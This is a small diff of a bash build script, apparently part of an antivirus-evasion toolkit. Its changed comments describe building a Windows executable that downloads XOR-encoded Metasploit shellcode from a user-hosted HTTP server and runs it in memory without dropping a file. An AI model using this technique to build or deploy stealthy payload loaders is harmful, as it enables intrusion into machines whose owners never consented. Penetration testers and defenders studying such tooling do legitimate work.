@@ -1,11 +1,13 @@
 #!/bin/bash 
-# example script for building executables with 64bit payload
+# Downloads and executes 64-bit shellcode, using sockets. Applies metasploit XOR encoding.
 
 # The generated msf shellcode file needs to be hosted on a HTTP server
 # Call the executable like:
 # output.exe http://yourserver/thepayload.bin
 # The executable downloads the shellcode into memory (no file is dropped on disk) and executes it.
 
+# print AVET logo
+cat banner.txt
 
 # include script containing the compiler var $win64_compiler
 # you can edit the compiler in build/global_win64.sh
